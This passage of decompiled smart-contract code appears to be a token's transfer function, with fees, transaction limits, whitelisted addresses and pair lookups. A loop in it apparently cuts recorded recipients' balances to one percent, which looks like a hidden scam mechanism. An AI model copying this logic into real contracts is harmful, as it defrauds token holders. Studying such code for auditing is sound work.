                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2,
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor15.length++
                                    stor15[stor15.length].field_0 = arg1
                                    stor15[stor15.length].field_256 = arg2
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                else:
                                    if arg2 and _fee > -1 / arg2:
                                        revert with 'NH{q', 17
                                    if not arg2:
                                        revert with 'NH{q', 18
                                    if arg2 * _fee / arg2 != _fee:
                                        revert with 0, 'SafeMath: multiplication overflow'
                                    require arg2 <= _maxTxAmount
                                    require ext_code.size(stor16)
                                    staticcall stor16.factory() with:
                                            gas gas_remaining wei
                                    mem[(8 * ceil32(return_data.size)) + 264] = ext_call.return_data[0]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(10 * ceil32(return_data.size)) + 264] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                    require ext_code.size(stor16)
                                    staticcall stor16.WETH() with:
                                            gas gas_remaining wei
                                           args mem[(10 * ceil32(return_data.size)) + 268 len 16 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    mem[(12 * ceil32(return_data.size)) + 268] = this.address
                                    mem[(12 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                                    require ext_code.size(address(ext_call.return_data[0]))
                                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                            gas gas_remaining wei
                                           args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 332 len 20 * ceil32(return_data.size)]
                                    if not ext_call.success:
                                        revert with ext_call.return_data[0 len return_data.size]
                                    require return_data.size >= 32
                                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                    if ext_call.return_data[12 len 20] == arg1:
                                        if arg2 < arg2 * _fee / 100:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[0] += arg2 * _fee / 100
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 - (arg2 * _fee / 100),
                                                      mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      arg1,
                                        if arg2 * _fee / 100 > 0:
                                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                                          arg2 * _fee / 100,
                                                          mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)],
                                                          msg.sender,
                                                          0,
                                        return 1, mem[(14 * ceil32(return_data.size)) + 296 len 24 * ceil32(return_data.size)]
                                    stor15.length++
                                    stor15[stor15.length].field_0 = arg1
                                    stor15[stor15.length].field_256 = arg2
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                return 1, mem[(14 * ceil32(return_data.size)) + 360 len 24 * ceil32(return_data.size)]
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0])
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if stor6[address(msg.sender)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if stor6[address(arg1)]:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if arg1 == this.address:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if ext_call.return_data[12 len 20] != msg.sender:
                            if msg.sender == address(ext_call.return_data[0]):
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        else:
                            if stor6[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                        if stor14:
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                        if not arg2:
                            require arg2 <= _maxTxAmount
                            require ext_code.size(stor16)
                            staticcall stor16.factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor16)
                            staticcall stor16.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor15.length++
                            stor15[stor15.length].field_0 = arg1
                            stor15[stor15.length].field_256 = arg2
                            if arg2 < 0:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -1:
                                revert with 'NH{q', 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                        else:
                            if arg2 and _fee > -1 / arg2:
                                revert with 'NH{q', 17
                            if not arg2:
                                revert with 'NH{q', 18
                            if arg2 * _fee / arg2 != _fee:
                                revert with 0, 'SafeMath: multiplication overflow'
                            require arg2 <= _maxTxAmount
                            require ext_code.size(stor16)
                            staticcall stor16.factory() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            require ext_code.size(stor16)
                            staticcall stor16.WETH() with:
                                    gas gas_remaining wei
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            mem[(15 * ceil32(return_data.size)) + 268] = this.address
                            mem[(15 * ceil32(return_data.size)) + 300] = address(ext_call.return_data[0])
                            require ext_code.size(address(ext_call.return_data[0]))
                            staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                    gas gas_remaining wei
                                   args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 332 len 5 * ceil32(return_data.size)]
                            if not ext_call.success:
                                revert with ext_call.return_data[0 len return_data.size]
                            require return_data.size >= 32
                            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                            if ext_call.return_data[12 len 20] == arg1:
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                                return 1, mem[(17 * ceil32(return_data.size)) + 296 len 9 * ceil32(return_data.size)]
                            stor15.length++
                            stor15[stor15.length].field_0 = arg1
                            stor15[stor15.length].field_256 = arg2
                            if arg2 < arg2 * _fee / 100:
                                revert with 'NH{q', 17
                            if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[0] += arg2 * _fee / 100
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 'NH{q', 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                revert with 'NH{q', 17
                            balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2 - (arg2 * _fee / 100),
                                          mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            if arg2 * _fee / 100 > 0:
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 * _fee / 100,
                                              mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)],
                                              msg.sender,
                                              0,
                        return 1, mem[(17 * ceil32(return_data.size)) + 360 len 9 * ceil32(return_data.size)]
                    idx = 0
                    while idx < stor15.length:
                        mem[0] = stor15[idx].field_0
                        mem[32] = 3
                        _651 = mem[64]
                        mem[64] = mem[64] + 64
                        mem[_651] = 26
                        mem[_651 + 32] = 'SafeMath: division by zero'
                        if idx >= stor15.length:
                            revert with 'NH{q', 50
                        mem[0] = stor15[idx].field_0
                        mem[32] = 3
                        balanceOf[stor15[idx].field_0] = balanceOf[stor15[idx].field_0] / 100
                        if idx == -1:
                            revert with 'NH{q', 17
                        idx = idx + 1
                        continue 
                    stor15.length = 0
                    mem[0] = 15
                    idx = 0
                    while 2 * stor15.length > idx:
                        stor15[idx].field_0 = 0
                        stor15[idx].field_256 = 0
                        idx = idx + 2
                        continue 
                    require ext_code.size(stor16)
                    staticcall stor16.factory() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7015 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7022 = mem[_7015]
                    require mem[_7015] == mem[_7015 + 12 len 20]
                    require ext_code.size(stor16)
                    staticcall stor16.WETH() with:
                            gas gas_remaining wei
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7040 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    _7046 = mem[_7040]
                    require mem[_7040] == mem[_7040 + 12 len 20]
                    mem[mem[64] + 4] = this.address
                    mem[mem[64] + 36] = address(_7046)
                    require ext_code.size(address(_7022))
                    staticcall address(_7022).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(_7046)
                    mem[mem[64]] = ext_call.return_data[0]
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    _7064 = mem[64]
                    mem[64] = mem[64] + ceil32(return_data.size)
                    require return_data.size >= 32
                    require mem[_7064] == mem[_7064 + 12 len 20]
                    if arg1 != mem[_7064 + 12 len 20]:
                        require ext_code.size(stor16)
                        staticcall stor16.factory() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7118 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7136 = mem[_7118]
                        require mem[_7118] == mem[_7118 + 12 len 20]
                        require ext_code.size(stor16)
                        staticcall stor16.WETH() with:
                                gas gas_remaining wei
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7184 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7214 = mem[_7184]
                        require mem[_7184] == mem[_7184 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7214)
                        require ext_code.size(address(_7136))
                        staticcall address(_7136).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7214)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7374 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7445 = mem[_7374]
                        require mem[_7374] == mem[_7374 + 12 len 20]
                        if mem[_7374 + 12 len 20] != msg.sender:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7811 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7811 + 32 len mem[_7811]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7445):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor15.length++
                                                            stor15[stor15.length].field_0 = arg1
                                                            stor15[stor15.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor6[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 6
                                if stor6[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7845 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7845 + 32 len mem[_7845]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor6[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor14:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(stor16)
                                                        staticcall stor16.factory() with:
